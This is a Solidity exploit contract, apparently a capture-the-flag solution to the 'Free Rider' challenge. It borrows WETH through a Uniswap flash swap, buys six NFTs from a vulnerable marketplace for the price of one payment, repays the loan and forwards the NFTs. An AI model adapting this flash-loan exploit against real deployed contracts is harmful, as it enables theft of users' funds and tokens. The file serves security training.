// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.17;

import {IUniswapV2Pair} from "./Interfaces.sol";
import {IERC20} from "openzeppelin-contracts/interfaces/IERC20.sol";
import {IERC721Receiver} from "openzeppelin-contracts/interfaces/IERC721Receiver.sol";
import {IERC721} from "openzeppelin-contracts/token/ERC721/IERC721.sol";


interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface IFreeRiderNFTMarketPlace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint amount) external;
}



contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair private immutable pair;
    IFreeRiderNFTMarketPlace private nftMarketPlace;
    IWETH internal weth;
    IERC721 internal dvNFT;
    address internal freeRiderBuyer;

    //amount to repay uniswap for flash swap 
    uint256 public amountToRepay;

    event BalanceOfContract(uint256 balance);
    

    constructor(address _uniswapPairAddress, address _nftMarketPlaceAddress, address _wethAddress, address _dvNFTAddress, address _freeRiderBuyerAddress){
        pair = IUniswapV2Pair(_uniswapPairAddress);
        nftMarketPlace = IFreeRiderNFTMarketPlace(_nftMarketPlaceAddress);
        weth = IWETH(_wethAddress);
        dvNFT = IERC721(_dvNFTAddress);
        freeRiderBuyer = _freeRiderBuyerAddress;
    }

    function initiateSwap() public {
        // Approve the uniswap contract the ability to transfer ETh
        // Need to pass some data to trigger uniswapV2Call. (token to borrow, caller that pays off token fees)
        bytes memory data = abi.encode(address(weth), address(this));

        // amount0Out is DVT, amount1Out is WETH
        pair.swap(0, 15e18, address(this), data);
    }

    function executeMarketPlaceAttack() internal {
       // initate calldata for token Ids to buy 
       // initalize 6 to prevent index out of bounds 
       uint256[] memory tokenIds = new uint256[](6);
       tokenIds[0] = 0;
       tokenIds[1] = 1;
       tokenIds[2] = 2;
       tokenIds[3] = 3;
       tokenIds[4] = 4;
       tokenIds[5] = 5;

       // call buyMany and 
       nftMarketPlace.buyMany{value: 15 ether}(tokenIds);
    }

        // This function is called by the DAI/WETH pair contract
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");

        // arbitrary data <> As long as data.length is >= 1 it will execute logic for flashswap

        // use the eth from the flashSwapped weth and execute MarketPlace attack function
        // first need to withdraw eth to this contract: converts weth to Eth.
        weth.withdraw(15e18);

        // Buy the 6 nfts - should revert unti I place an ERC721 reciver
        executeMarketPlaceAttack();

        // about 0.3% fee, +1 to round up
        uint fee = (amount1 * 3) / 997 + 1;
        amountToRepay = amount1 + fee;

        // Show proof of bug that I recive all nfts and total worth of the NFTs in my wallet all for 15ETH
        // emit BalanceOfContract(address(this).balance);

        //Deposit amounToRepay in weth in order to pay back the flashswap loan amount + fee
        weth.deposit{value:amountToRepay}();

        // Repay
        weth.transfer(address(pair), amountToRepay);


       _transferAllNFTs();
    }

    function _transferAllNFTs() internal{
        for(uint256 i = 0; i < 6; i++){
             dvNFT.safeTransferFrom(address(this),freeRiderBuyer, i);
        }

    }
    function onERC721Received(address, address, uint256 _tokenId, bytes memory)
        external
        override
        returns (bytes4)
    {

        return IERC721Receiver.onERC721Received.selector;
    }
   
    // Create ERC721 receiver 
    receive() external payable{}


}


    

